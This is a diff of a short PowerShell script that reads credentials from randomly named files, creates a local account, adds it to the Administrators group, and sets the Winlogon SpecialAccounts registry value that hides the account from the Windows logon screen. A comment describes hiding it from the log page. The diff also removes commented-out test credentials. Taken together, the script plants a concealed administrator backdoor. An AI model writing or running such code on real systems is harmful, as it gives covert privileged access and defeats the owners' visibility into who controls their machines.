@@ -6,13 +6,10 @@ $addr = ((Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddre
 $user = (Get-Content ./etgtYmwQUO.txt)
 $p = (ConvertTo-SecureString (Get-Content ./f4EWj29Hgq.txt) -AsPlainText -Force)
 
-
-#$user = "test"
-#$p = ConvertTo-SecureString "test" -AsPlainText -Force
-
 # Local user for "something" and "then excluding them from log page"
 New-LocalUser $user -Password $p -FullName $user -Description $user
 Add-LocalGroupMember -Group "Administrators" -Member $user
+
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v $user
 
 
